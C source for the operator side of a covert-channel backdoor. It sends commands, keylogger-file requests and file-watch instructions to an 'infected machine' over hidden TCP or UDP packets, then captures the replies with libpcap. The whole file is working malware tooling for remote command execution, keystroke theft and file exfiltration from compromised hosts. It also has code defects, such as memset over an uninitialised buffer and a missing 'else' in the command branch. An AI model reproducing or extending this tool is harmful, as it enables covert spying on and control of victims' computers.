#include <getopt.h>
#include <pthread.h>
#include "../src/encrypt_utils.h"
#include "../src/socketwrappers.h"
#include "../src/covert_wrappers.h"
#include "../src/inotify.h"
#include "../src/libpcap.h"

static void print_usage(void) {
    puts ("Usage options: \n"
            "\t--keylogger -   get keylogger file\n"
            "\t--target    -   target machine to attack\n"
            "\t--command   -   command to request from infected machine\n"
            "\t--local     -   your local ip\n"
            "\t--tcp       -   use TCP protocol\n"
            "\t--directory -   directory to watch\n"
            "\t--file      -   file to watch\n");
}

static struct option long_options[] = {
    {"keylogger", optional_argument,  0,  0 },
    {"target",    required_argument,  0,  1 },
    {"command",   required_argument,  0,  2 },
    {"local",     required_argument,  0,  3 },
    {"tcp",       optional_argument,  0,  4 },
    {"directory", required_argument,  0,  5 },
    {"file",      required_argument,  0,  6 },
    {0,         0,                  0,  0 }
};



int main(int argc, char **argv){
    int arg;
    char targetip[BUFSIZ];
    char localip[BUFSIZ];
    char data[BUFSIZ];
    char pcapfilter[BUFSIZ];
    char file[BUFSIZ];
    char directory[BUFSIZ];
    bool tcp = false, if_directory = false, if_file = false, if_command = false, if_keylogger = false;
    /* make sure user has root privilege */
    if(geteuid() != 0) {
        printf("Must run as root\n");
        exit(1);
    }

    memset(data, 0, strlen(data));

    while (1) {
        int option_index = 0;

        arg = getopt_long(argc, argv, "", long_options, &option_index);

        if(arg == -1) {
            break;
        }

        switch (arg) {
            case 0:
                if_keylogger = true;
                break;
            case 1:
                strncpy(targetip, optarg, BUFSIZ);
                break;
            case 2:
                if_command = true;
                strncpy(data,optarg, BUFSIZ);
                printf("Command %s\n", data);
                break;
            case 3:
                strncpy(localip, optarg, BUFSIZ);
                break;
            case 4:
                tcp = true;
                break;
            case 5:
                if_directory = true;
                strncpy(directory, optarg, BUFSIZ);
                printf("Directory: %s\n", directory);
                break;
            case 6:
                if_file = true;
                strncpy(file, optarg, BUFSIZ);
                printf("File: %s\n", file);
                break;
            default: /*  '?' */
                print_usage();
                exit(1);
        }
    }


    //create filter (tcp/udp, command, ip, port)
    struct filter Filter = InitFilter(targetip, localip, false, tcp);
    CreateFilter(pcapfilter, tcp);
    printf("Filter: %s\n",pcapfilter);

    //validate inotify directory and file
    if((if_directory && !if_file) || (!if_directory && if_file)) {
        perror("inotify requires both --directory and --file");
        print_usage();
        return 0;
    }

    //COMMAND
    if(if_command == true && tcp == true) {
        covert_send(localip, targetip, UPORT, UPORT, data, COMMAND);
        covert_send(localip, targetip, UPORT, UPORT, data, EOT);
    } if(if_command == true && tcp == false) {
        covert_udp_send_data(localip, targetip, UPORT, UPORT, data, COMMAND);   //also sends EOT

    //INOTIFY
    } else if(if_file == true && if_directory == true) {
        snprintf(data, BUFSIZ, "%s\n%s", directory, file);
        printf("data: %s\n", data);

        if(tcp == true) {
            covert_send(localip, targetip, UPORT, UPORT, data, INOTIFY);
            covert_send(localip, targetip, UPORT, UPORT, data, EOT);
        } else {
            covert_udp_send_data(localip, targetip, UPORT, UPORT, data, INOTIFY);   //also sends EOT
        }

    //KEYLOGGER
    } else if (if_keylogger == true && tcp == true) {
        covert_send(localip, targetip, UPORT, UPORT, data, KEYLOGGER);
        covert_send(localip, targetip, UPORT, UPORT, data, EOT);
    } else if (if_keylogger == true && tcp == false) {
        covert_udp_send_data(localip, targetip, UPORT, UPORT, data, KEYLOGGER); //also sends EOT

    }


    //libpcap (tcp/udp, command)
    Packetcapture(pcapfilter, Filter);

    return 0;
}
